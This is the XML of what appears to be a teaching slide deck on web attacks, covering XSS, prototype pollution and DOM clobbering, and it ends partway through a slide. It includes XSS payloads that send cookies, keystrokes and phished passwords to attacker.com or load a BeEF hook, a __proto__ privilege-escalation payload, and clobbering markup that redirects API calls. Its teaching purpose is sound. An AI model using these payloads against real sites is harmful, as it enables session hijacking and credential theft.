          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8963978" y="5917644"/>
            <a:ext cx="138470" cy="17299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Mona Sans Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8963978" y="6137553"/>
            <a:ext cx="3128605" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="373B48"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8963978" y="6237208"/>
            <a:ext cx="3128605"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Browser executes injected script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="6603921"/>
            <a:ext cx="138470" cy="17299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Mona Sans Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="6823829"/>
            <a:ext cx="4735235" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="373B48"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="6923484"/>
            <a:ext cx="4735235"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Script steals cookies/session tokens</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7357348" y="6603921"/>
            <a:ext cx="138470" cy="172998"/>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Mona Sans Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7357348" y="6823829"/>
            <a:ext cx="4735235" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="373B48"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7357348" y="6923484"/>
            <a:ext cx="4735235" cy="178356"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker gains access to user's account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619851" y="1103590"/>
            <a:ext cx="2300168" cy="255151"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>XSS Payload Examples</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2619851" y="1521976"/>
            <a:ext cx="9390578" cy="5603915"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1020"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2613065" y="1521976"/>
            <a:ext cx="9404152" cy="5603915"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 364"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2749153" y="1624013"/>
            <a:ext cx="9131975" cy="5399842"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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1. Cookie Stealing</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fetch('https://attacker.com/steal?cookie=' + document.cookie);</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2. Keylogger</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document.onkeypress = function(e) {</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fetch('https://attacker.com/log?key=' + e.key);</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3. Fake Login Form</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document.body.innerHTML = `</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&lt;h1&gt;Session Expired - Please Login&lt;/h1&gt;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&lt;form action="https://attacker.com/phish" method="POST"&gt;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&lt;input name="username" placeholder="Username"&gt;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&lt;input name="password" type="password" placeholder="Password"&gt;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&lt;button type="submit"&gt;Login&lt;/button&gt;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&lt;/form&gt;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4. Redirect to Malware</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window.location = 'https://attacker.com/malware.exe';</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&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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5. BeEF Hook (Browser Exploitation Framework)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="135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&lt;script src="https://attacker.com/hook.js"&gt;&lt;/script&gt;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02449" y="311825"/>
            <a:ext cx="2471261" cy="283488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4.2 Prototype Pollution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="617934"/>
            <a:ext cx="2319457"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What is Prototype Pollution?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="915591"/>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52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Prototype pollution exploits JavaScript's prototype inheritance to inject properties into Object.prototype, affecting all objects in the application.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1136690"/>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Vulnerable Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1434346"/>
            <a:ext cx="7825502" cy="2483525"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1918"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="1434346"/>
            <a:ext cx="7836694" cy="2483525"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 685"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1519357"/>
            <a:ext cx="7609999" cy="2313503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Vulnerable merge function</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function merge(target, source)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for (let key in source)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if (typeof source[key] === 'object')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target[key] = merge(target[key] || {}, source[key]);</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else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target[key] = source[key];</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return target;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Normal usage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user =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input = {name: "John", age: 30};</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merge(user, input);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console.log(user); // {name: "John", age: 30}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4002881"/>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Attack Payload:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4300538"/>
            <a:ext cx="7825502" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4243"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="4300538"/>
            <a:ext cx="7836694" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1515"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="4385548"/>
            <a:ext cx="7609999" cy="952619"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Malicious input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maliciousInput = JSON.parse('{"__proto__": {"isAdmin": true}}');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merge({}, maliciousInput);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Now ALL objects have isAdmin property!</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newUser =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console.log(newUser.isAdmin); // true (POLLUTED!)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5508188"/>
            <a:ext cx="1987391"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Real-World Exploitation:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5805845"/>
            <a:ext cx="7825502" cy="2211348"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2154"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="5805845"/>
            <a:ext cx="7836694" cy="2211348"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 769"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="5890855"/>
            <a:ext cx="7609999" cy="2041327"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Example: Privilege Escalation</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function checkAdmin(user)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if (user.isAdmin)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return "Access Granted";</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return "Access Denied";</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Attacker pollutes prototype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payload = JSON.parse('{"__proto__": {"isAdmin": true}}');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merge({}, payload);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Now any user becomes admin!</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let normalUser = {name: "Attacker"};</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console.log(checkAdmin(normalUser)); // "Access Granted"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913340" y="1124069"/>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373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4.3 DOM Clobbering</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913340" y="1471612"/>
            <a:ext cx="2386013" cy="239078"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What is DOM Clobbering?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913340" y="1818323"/>
            <a:ext cx="8803719" cy="159544"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>DOM Clobbering exploits how browsers create global variables for HTML elements with id or name attributes.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913340" y="2085499"/>
            <a:ext cx="1913811" cy="239078"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913340" y="2432209"/>
            <a:ext cx="8803719" cy="1467564"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3652"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2907030" y="2432209"/>
            <a:ext cx="8816340" cy="1467564"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1304"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3034546" y="2527816"/>
            <a:ext cx="8561308" cy="1276350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;script&gt;</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Application expects config from server</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if (window.config &amp;&amp; window.config.apiUrl) {</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fetch(window.config.apiUrl + '/data')</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.then(response =&gt; response.json())</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.then(data =&gt; console.log(data));</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&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913340" y="4007406"/>
            <a:ext cx="1913811" cy="239078"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913340" y="4354116"/>
            <a:ext cx="8803719" cy="1148477"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2907030" y="4354116"/>
            <a:ext cx="8816340" cy="1148477"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3034546" y="4449723"/>
            <a:ext cx="8561308" cy="957263"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 Attacker injects this HTML --&gt;</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&lt;a id="config" href="https://attacker.com"&gt;</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&lt;a id="apiUrl" href="https://attacker.com/evil"&gt;&lt;/a&gt;</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&lt;/a&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
